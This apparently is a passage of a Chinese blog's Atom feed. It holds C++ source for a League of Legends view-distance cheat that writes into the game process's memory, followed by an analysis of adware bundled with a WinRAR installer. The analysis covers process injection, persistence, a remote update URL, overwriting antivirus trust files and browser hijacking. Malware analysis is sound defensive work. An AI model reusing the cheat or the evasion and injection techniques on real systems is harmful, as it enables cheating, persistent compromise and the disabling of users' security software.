class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// SightFunc.cpp</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">"stdafx.h"</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">"SightFunc.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">GetProcessIdByName</span><span class="params">(LPCTSTR lpFilename)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    HANDLE hProcessSnap = <span class="literal">NULL</span>; </span><br><span class="line">    DWORD dwProcessId = <span class="number">0</span>;</span><br><span class="line">    PROCESSENTRY32 pe32 = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    pe32.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32); </span><br><span class="line">    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(hProcessSnap == INVALID_HANDLE_VALUE) </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(!Process32First(hProcessSnap,&amp;pe32))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> i = GetLastError();</span><br><span class="line">        CloseHandle(hProcessSnap);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">0</span> == _wcsicmp(pe32.szExeFile,lpFilename))</span><br><span class="line">        &#123;</span><br><span class="line">            dwProcessId = pe32.th32ProcessID;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(Process32Next(hProcessSnap,&amp;pe32));</span><br><span class="line"></span><br><span class="line">    CloseHandle(hProcessSnap);</span><br><span class="line">    <span class="keyword">return</span> dwProcessId;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回进程指定模块基址</span></span><br><span class="line"><span class="function">BYTE *<span class="title">GetProcessModBaseAddr</span><span class="params">(LPCTSTR lpFilename, DWORD dwPID)</span> </span><br><span class="line"></span>&#123; </span><br><span class="line">    HANDLE hModuleSnap = INVALID_HANDLE_VALUE; </span><br><span class="line">    MODULEENTRY32 me32 = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    me32.dwSize = <span class="keyword">sizeof</span>( MODULEENTRY32 ); </span><br><span class="line">    BYTE *pModBaseAddr = <span class="literal">NULL</span>;</span><br><span class="line">    hModuleSnap = CreateToolhelp32Snapshot( TH32CS_SNAPMODULE, dwPID ); </span><br><span class="line">    <span class="keyword">if</span>(INVALID_HANDLE_VALUE == hModuleSnap) </span><br><span class="line">    &#123;</span><br><span class="line">        wprintf(<span class="string">L"CreateToolhelp32Snapshot (of modules %d) Error! ErrorCode: %d"</span>, dwPID, GetLastError());</span><br><span class="line">        <span class="keyword">goto</span> gleave;</span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( Module32First( hModuleSnap, &amp;me32 )) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">do</span> </span><br><span class="line">        &#123; </span><br><span class="line">            <span class="keyword">if</span>(<span class="number">0</span> == _wcsicmp(me32.szModule,lpFilename))</span><br><span class="line">            &#123;</span><br><span class="line">                pModBaseAddr = me32.modBaseAddr;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">while</span>( Module32Next( hModuleSnap, &amp;me32 ) ); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123; </span><br><span class="line">        wprintf(<span class="string">L"Module32First Error! ErrorCode: %d"</span>, GetLastError()); </span><br><span class="line">        <span class="keyword">goto</span> gleave;</span><br><span class="line">    &#125; </span><br><span class="line">gleave:</span><br><span class="line">    <span class="keyword">if</span> (hModuleSnap)</span><br><span class="line">        CloseHandle( hModuleSnap );</span><br><span class="line">    <span class="keyword">return</span> pModBaseAddr;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span><br><span class="line">功能:   是否开启Debug权限</span><br><span class="line">参数:   lpName:"SeDebugPrivilege"</span><br><span class="line">        fEnable:TRUE表示开启,反之禁用</span><br><span class="line">返回值: TRUE/FLASE</span><br><span class="line">SE_DEBUG_NAME SeDebugPrivilege</span><br><span class="line">*/</span></span><br><span class="line"><span class="function">BOOL <span class="title">EnablePrivilege</span><span class="params">(LPCTSTR lpszPrivilegeName, BOOL bEnable)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    HANDLE hToken;</span><br><span class="line">    TOKEN_PRIVILEGES tp = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    LUID luid = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    BOOL bRet = FALSE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!OpenProcessToken(GetCurrentProcess(),</span><br><span class="line">        TOKEN_ADJUST_PRIVILEGES |</span><br><span class="line">        TOKEN_QUERY | TOKEN_READ,</span><br><span class="line">        &amp;hToken))</span><br><span class="line">    &#123;</span><br><span class="line">        bRet =FALSE;</span><br><span class="line">        <span class="keyword">goto</span> gleave;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(LookupPrivilegeValue(<span class="literal">NULL</span>, lpszPrivilegeName, &amp;luid))</span><br><span class="line">    &#123;</span><br><span class="line">        tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Luid = luid;</span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = (bEnable) ? SE_PRIVILEGE_ENABLED : <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (AdjustTokenPrivileges(hToken,FALSE,&amp;tp,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            bRet = TRUE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">gleave:</span><br><span class="line">    <span class="keyword">if</span> (hToken)</span><br><span class="line">        CloseHandle(hToken);</span><br><span class="line">    <span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">WinInit</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    system(<span class="string">"color 02 &amp; title 英雄联盟无限视距修改器"</span>);</span><br><span class="line">    <span class="keyword">time_t</span> timer; </span><br><span class="line">    time(&amp;timer); </span><br><span class="line">    <span class="keyword">struct</span> tm newtime;</span><br><span class="line">    localtime_s(&amp;newtime, &amp;timer); </span><br><span class="line">    <span class="comment">//wprintf(L"***********************************\n");</span></span><br><span class="line">    wprintf(<span class="string">L"%d.%d.%d"</span>, newtime.tm_year+<span class="number">1900</span>, newtime.tm_mon+<span class="number">1</span>, newtime.tm_mday);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"--&gt; 右键-&gt;管理员身份运行,请低调使用!\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"--&gt; 默认视距4000,修改说明:Infinite Sight.ini\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"--&gt; 选完英雄,进入游戏读条界面以后使用!\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"--&gt; 勿传播,勿做非法用途!!! \n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"                Date 2014.08.25 \n\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"--------------------------------------\n\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取配置文件信息</span></span><br><span class="line"><span class="function">PINI_ProfileInfor <span class="title">GetPrivateProfileInfor</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	DWORD bRet = <span class="number">0</span>;</span><br><span class="line">	PINI_ProfileInfor pIniProfileInfor = <span class="keyword">new</span> INI_ProfileInfor;</span><br><span class="line">	<span class="built_in">memset</span>(pIniProfileInfor, <span class="number">0</span>, <span class="keyword">sizeof</span>(INI_ProfileInfor));</span><br><span class="line">	WCHAR strPath[MAX_PATH] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	WCHAR strIniPath[MAX_PATH] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	DWORD newSight = <span class="number">0</span>;</span><br><span class="line">	DWORD oldSight = <span class="number">0</span>;</span><br><span class="line">	DWORD dwRVA = <span class="number">0</span>;</span><br><span class="line">	bRet = GetCurrentDirectoryW(MAX_PATH,strPath);</span><br><span class="line">	<span class="keyword">if</span> (bRet &gt; MAX_PATH)</span><br><span class="line">	&#123;</span><br><span class="line">		pIniProfileInfor-&gt;bRet = FALSE;</span><br><span class="line">		wprintf(<span class="string">L"GetCurrentDirectory Error! ErrorCode: %d\n"</span>, GetLastError());</span><br><span class="line">		<span class="keyword">goto</span> gleave;</span><br><span class="line">	&#125;</span><br><span class="line">	swprintf_s(strIniPath, MAX_PATH, <span class="string">L"%s%s"</span>, strPath, <span class="string">L"\\Infinite Sight.ini"</span>);</span><br><span class="line"></span><br><span class="line">	newSight = GetPrivateProfileInt(<span class="string">L"New Sight"</span>, <span class="string">L"newSight"</span>, <span class="number">0</span>, strIniPath);</span><br><span class="line">	<span class="keyword">if</span> (<span class="number">2250</span> &gt; newSight || <span class="number">4000</span> &lt; newSight)</span><br><span class="line">	&#123;</span><br><span class="line">		pIniProfileInfor-&gt;bRet = FALSE;</span><br><span class="line">		wprintf(<span class="string">L"The newSight Value Error!\n"</span>);</span><br><span class="line">		<span class="keyword">goto</span> gleave;</span><br><span class="line">	&#125;</span><br><span class="line">	oldSight = GetPrivateProfileInt(<span class="string">L"Old Sight"</span>, <span class="string">L"oldSight"</span>, <span class="number">0</span>, strIniPath);</span><br><span class="line">	<span class="keyword">if</span> (<span class="number">2250</span> != oldSight)</span><br><span class="line">	&#123;</span><br><span class="line">		pIniProfileInfor-&gt;bRet = FALSE;</span><br><span class="line">		wprintf(<span class="string">L"The oldSight Value Error!\n"</span>);</span><br><span class="line">		<span class="keyword">goto</span> gleave;</span><br><span class="line">	&#125;</span><br><span class="line">	dwRVA = GetPrivateProfileInt(<span class="string">L"Error"</span>, <span class="string">L"Value"</span>, <span class="number">0</span>, strIniPath);</span><br><span class="line">	<span class="keyword">if</span> (<span class="number">0</span> == dwRVA)</span><br><span class="line">	&#123;</span><br><span class="line">		pIniProfileInfor-&gt;bRet = FALSE;</span><br><span class="line">		wprintf(<span class="string">L"The dwRVA Value Error!\n"</span>);</span><br><span class="line">		<span class="keyword">goto</span> gleave;</span><br><span class="line">	&#125;</span><br><span class="line">	pIniProfileInfor-&gt;newSight = float2hex(newSight);</span><br><span class="line">	pIniProfileInfor-&gt;oldSight = float2hex(oldSight);</span><br><span class="line">	pIniProfileInfor-&gt;dwRVA = dwRVA;</span><br><span class="line">	pIniProfileInfor-&gt;bRet = TRUE;</span><br><span class="line">gleave:</span><br><span class="line">	<span class="keyword">return</span> pIniProfileInfor;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">float2hex</span><span class="params">(<span class="keyword">float</span> f)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	DWORD h = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span> *pf = (<span class="keyword">char</span>*)&amp;f;</span><br><span class="line">	<span class="keyword">if</span> (pf)</span><br><span class="line">	&#123;</span><br><span class="line">		h = *(DWORD *)pf;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">SetNewSight</span><span class="params">(HANDLE hProcess, BYTE *pTagModBaseAddr, DWORD newSightValue, DWORD oldSightValue, DWORD dwRVA)</span></span><br><span class="line"></span>&#123;</span><br><span class="line"></span><br><span class="line">	BOOL bRet = FALSE;</span><br><span class="line">	BOOL isNewSight = FALSE;</span><br><span class="line">	DWORD dwSight = <span class="number">0</span>;</span><br><span class="line">	DWORD dwRead = <span class="number">0</span>;</span><br><span class="line">	DWORD dwNewSight = <span class="number">0</span>;</span><br><span class="line">	DWORD dwWrite = <span class="number">0</span>;</span><br><span class="line">	DWORD dwOldProtect = <span class="number">0</span>;</span><br><span class="line">	DWORD dwInitProtect = <span class="number">0</span>;</span><br><span class="line">	pTagModBaseAddr = pTagModBaseAddr + dwRVA;</span><br><span class="line">	bRet = VirtualProtectEx(hProcess, pTagModBaseAddr, <span class="number">0x4</span>, <span class="number">0x40</span>, &amp;dwInitProtect); <span class="comment">//PAGE_EXECUTE_READWRITE </span></span><br><span class="line">	<span class="keyword">if</span> (!bRet)</span><br><span class="line">	&#123;</span><br><span class="line">		wprintf(<span class="string">L"Change PAGA_attribute error! ErrorCode: %d\n"</span>, GetLastError());</span><br><span class="line">		<span class="keyword">goto</span> gleave;</span><br><span class="line">	&#125;	</span><br><span class="line">	bRet = ReadProcessMemory(hProcess, pTagModBaseAddr, &amp;dwSight, <span class="number">4</span>, &amp;dwRead);</span><br><span class="line">	<span class="keyword">if</span> (!bRet)</span><br><span class="line">	&#123;</span><br><span class="line">		wprintf(<span class="string">L"ReadProcessMemory error! ErrorCode: %d\n"</span>, GetLastError());</span><br><span class="line">		<span class="keyword">goto</span> gleave;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (oldSightValue == dwSight &amp;&amp; <span class="number">4</span> == dwRead)</span><br><span class="line">	&#123;</span><br><span class="line">		dwNewSight = newSightValue;</span><br><span class="line">		bRet = WriteProcessMemory(hProcess, pTagModBaseAddr, &amp;dwNewSight, <span class="number">4</span>, &amp;dwWrite);</span><br><span class="line">		<span class="keyword">if</span> (!bRet)</span><br><span class="line">		&#123;</span><br><span class="line">			wprintf(<span class="string">L"WriteProcessMemory error! ErrorCode: %d\n"</span>, GetLastError());</span><br><span class="line">			<span class="keyword">goto</span> gleave;</span><br><span class="line">		&#125;</span><br><span class="line">		isNewSight = TRUE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		isNewSight = FALSE;</span><br><span class="line">		wprintf(<span class="string">L"The Sight Value not found!\n"</span>);</span><br><span class="line">	&#125;    </span><br><span class="line"></span><br><span class="line">	bRet = VirtualProtectEx(hProcess, pTagModBaseAddr, <span class="number">0x4</span>, dwInitProtect, &amp;dwOldProtect); <span class="comment">//0x40 PAGE_EXECUTE_READWRITE </span></span><br><span class="line">	<span class="keyword">if</span> (!bRet)</span><br><span class="line">	&#123;</span><br><span class="line">		wprintf(<span class="string">L"Resume PAGA_attribute error! ErrorCode: %d\n"</span>, GetLastError());</span><br><span class="line">	&#125;</span><br><span class="line">gleave:</span><br><span class="line">	<span class="keyword">return</span> isNewSight;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="配置文件模版">配置文件模版</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[说明]</span><br><span class="line">文件名为：Infinite Sight.ini</span><br><span class="line">默认视距为最大值<span class="number">4000</span>，如需修改视距，改变<span class="keyword">new</span> Sight值即可，如<span class="number">3000</span>视距改为<span class="keyword">new</span> Sight = <span class="number">3000</span>，修改值必须在<span class="number">2250</span>-<span class="number">4000</span>之间!</span><br><span class="line">请勿移动本配置文件，需和Infinite Sight.exe在同目录下。</span><br><span class="line">此插件为个人使用，请勿非法传播 :)</span><br><span class="line"></span><br><span class="line">[New Sight]</span><br><span class="line">newSight = <span class="number">4000</span></span><br><span class="line"></span><br><span class="line">[Old Sight]</span><br><span class="line">oldSight = <span class="number">2250</span></span><br></pre></td></tr></table></figure>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="原理">原理</h2><p>游戏进程<code>League of Legends.exe</code>中某个偏移记录着视距值，游戏根据这个数值设置你的当前游戏的屏幕分辨率，最大只能达到屏幕的极限分辨率那么大，所以一旦调的太大了外面只能看到黑色一片。</p>
<h]]>
    </summary>
    
      <category term="lol" scheme="http://blog.idhyt.com/tags/lol/"/>
    
      <category term="technic" scheme="http://blog.idhyt.com/categories/technic/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[病毒分析-捆绑推广]]></title>
    <link href="http://blog.idhyt.com/2014/07/24/virus-malware-winrar/"/>
    <id>http://blog.idhyt.com/2014/07/24/virus-malware-winrar/</id>
    <published>2014-07-24T06:13:11.000Z</published>
    <updated>2015-12-31T11:57:58.000Z</updated>
    <content type="html"><![CDATA[<p>捆绑安装，流氓推广</p>
<h2 id="简介">简介</h2><p>1.压缩软件Winrar官方安装包中附带了没有数字签名病毒文件WinRAROp.exe，该文件在Winrar安装时一并运行。</p>
<p>2.病毒文件运行之后解密同目录下的zap.dat文件并释放病毒子体sclvntfy.dll文件以及驱动文件，之后添加驱动服务以及设置自启动，篡改浏览器主页，终止杀软，劫持用户浏览器打开推广页面<a href="http://123.sogou.com/?21607" target="_blank" rel="external">http://123.sogou.com/?21607</a></p>
<h2 id="母体运行流程">母体运行流程</h2><p>释放子体<br>1.创建目录”C:\RavRecycle\temp\”,7F,””,7F,””,7F,””,7F,””,7F,””,7F,””,7F,””,7F,”?..\”并设置属性为HIDDEN|SYSTEM|DIRECTORY</p>
<p>2.将Winrar安装包中的zap.dat文件重命名拷贝到创建的目录C:\RavRecycle\temp\”,7F,””,7F,””,7F,””,7F,””,7F,””,7F,””,7F,””,7F,”?..\ravtmp0.dat</p>
<p>3.解密安装包中zap.dat文件释放子体sclvntfy.dll。<br>先读取zap.dat文件0x1408字节的数据进行解密，从解密数据偏移0x1C处获取文件sclvntfy.dll数据起始位置0x1408，偏移0x20处获取DWORD值0x2C000加0x400即为sclvntfy.dll文件大小0x2C400，每次拷贝0x800字节，拷贝过后进行解密，解密过后释放 system32目录下，<br>key[i] = 1234567890abcdefghijklmnopqrstuvwxyz，解密算法如下：<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-winrar-1.jpg" alt=""><br>同样方式从文件ravtmp0.dat中sclvntfy.dat，该文件为驱动文件。</p>
<p>4.添加自启动HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages下添加sclvntfy键值，设置开机自启动。</p>
<p>5.将自身WinRAROp.exe加入系统服务中，开机随系统启动。</p>
<p>6.加载sclvntfy.dll文件，获取函数InitializeChangeNotifyEx并调用。</p>
<p>7.函数InitializeChangeNotifyEx函数功能<br>7.1注入winlogon.exe，提升进程权限，遍历进程查找winlogon.exe进程，获取进程ID，将sclvntfy.dll文件注入该进程<br>7.2Temp目录下ravzap.dat文件中偏移0x0，0x2，0x7写入数据0标志已注入。</p>
<h2 id="子体Sclvntfy-dll功能">子体Sclvntfy.dll功能</h2><h3 id="删除病毒母体文件">删除病毒母体文件</h3><pre><code>SYSTEM<span class="command">\CurrentControlSet</span><span class="command">\Services</span><span class="command">\WinRAROp</span><span class="command">\Security</span>
SYSTEM<span class="command">\CurrentControlSet</span><span class="command">\Services</span><span class="command">\WinRAROp</span><span class="command">\Enum</span>
SYSTEM<span class="command">\CurrentControlSet</span><span class="command">\Services</span><span class="command">\WinRAROp</span>
C:<span class="command">\Program</span> Files<span class="command">\winrar</span><span class="command">\WinRAROp</span>.exe
</code></pre><h3 id="自检测，注入进程">自检测，注入进程</h3><p>1.Sclvntfy.dll加载过后，先检测自身是否被explorer.exe，lsass.exe，winlogon.exe加载，不是则直接退出。</p>
<p>2.遍历进程，查找explorer.exe，lsass.exe，winlogon.exe，如果存在，则注入。</p>
<p>3.在注册表项SOFTWARE\Tencent\TXBSO\下生成键名Value1 = 0，注入成功后，Value1 = 1</p>
<h3 id="自启动">自启动</h3><p>注册自身系统驱动服务sclvntfy.sys，随机加载启动，用于写入360保护文件<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-winrar-2.jpg" alt=""></p>
<h3 id="自更新">自更新</h3><p>病毒会从远程服务器更新ravwap.dat文件，链接</p>
<pre><code><span class="string">http:</span><span class="comment">//www.ronsung.com/ravwap.chm</span>
</code></pre><p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-winrar-3.jpg" alt=""></p>
<h3 id="绕过杀软，添加自身到信任列表">绕过杀软，添加自身到信任列表</h3><p>1.绕过QQ管家主动防御：<br>检测注册表项SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\QQPCMgr中键值DisplayName是否存在，如存在则将C:\RavRecycle\temp\7F7F7F….5C\ravtmp4.dat文件覆盖拷贝到”C:\Documents and Settings\All Users\Application Data\Tencent\QQPCMgr\qmvext.db”，该文件为QQ管家拦截规则数据库文件，将其替换添加自身到信任列表，即可绕过QQ管家。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-winrar-4.jpg" alt=""></p>
<p>2.同样的方法，绕过金山卫士。<br>C:\RavRecycle\temp\7F7F7F….5C\ravtmp3.dat<br>替换<br>C:\Program Files\KSafe\kusrtrst.dat</p>
<p>3.绕过Kingsoft Internet Security<br>C:\RavRecycle\temp\7F7F7F….5C\ravtmp2.dat<br>替换<br>C:\Program Files\kingsoft\kingsoft antivirus\security\kxescan\kusrtrst.dat</p>
<p>4.绕过360安全卫士<br>360有文件保护功能，通过驱动模块sclvntfy.sys将数据写入。<br>C:\RavRecycle\temp\7F7F7F….5C\ravtmp1.dat<br>替换<br>C|D|E:\Program Files\360\360Safe\ipc\kpuaf.dat<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-winrar-5.jpg" alt=""></p>
<h3 id="删除其他网址保护程序">删除其他网址保护程序</h3><p>先重命名，然后删除<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-winrar-6.jpg" alt=""></p>
<h3 id="删除其他快捷图标">删除其他快捷图标</h3><p>删除桌面 毒霸网址大全以及其他快捷图标<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-winrar-7.png" alt=""><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-winrar-8.jpg" alt=""></p>
<h3 id="篡改IE主页">篡改IE主页</h3><p>1.判断浏览器是否为IE，如果不是则判断是否为其他浏览器，如果是IE判断首页如果为hao.360.cn或者无首页，在注册表下HKEY_LOCAL_MACHINE\SOFTWARE\Tencent\TXBSO生成键名Value3，键值随机数。</p>
<p>2.解密出推广链接将其设为IE主页，将快播配置文件QvodCfg.in中Other下Home键值置0即删除快播主页。</p>
<pre><code><span class="string">http:</span><span class="comment">//123.sogou.com/?21607</span>
</code></pre><p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-winrar-9.jpg" alt=""></p>
<h3 id="浏览器劫持">浏览器劫持</h3><p>HOOK系统函数，劫持浏览器，结束360进程，解除浏览器保护文件。<br>1.HOOK系统函数，CreateProcessW，LoadLibraryExW，ShellExecuteExW，CreateProcessW，ShellExecuteExW函数在创建浏览器进程之后，会劫持该浏览器进程创建过程，在后边加入推广链接<a href="http://123.sogou.com/?21607" target="_blank" rel="external">http://123.sogou.com/?21607</a></p>
<p>2.浏览器列表如下：<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-winrar-10.jpg" alt=""></p>
<p>3.劫持进程如下<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-winrar-11.jpg" alt=""><br>同时还会检测进程创建是否为360safe.exe，360tray.exe，360sd.exe，如果是的话直接退出不创建。</p>
<p>4.过滤其他主页保护进程<br>LoadLibraryExW在加载dll文件之前会先判断dll文件是否为其他的主页保护文件，如果是的话，直接退出不加载。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-winrar-12.jpg" alt=""></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>捆绑安装，流氓推广</p>
<h2 id="简介">简介</h2><p>1.压缩软件Winrar官方安装包中附带了没有数字签名病毒文件WinRAROp.exe，该文件在Winrar安装时一并运行。</p>
<p>2.病毒文件运行之后解密同目录下的zap.dat文件并释放病毒]]>
    </summary>
    
      <category term="推广" scheme="http://blog.idhyt.com/tags/%E6%8E%A8%E5%B9%BF/"/>
    
      <category term="virus" scheme="http://blog.idhyt.com/categories/virus/"/>
    
  </entry>
  
</feed>
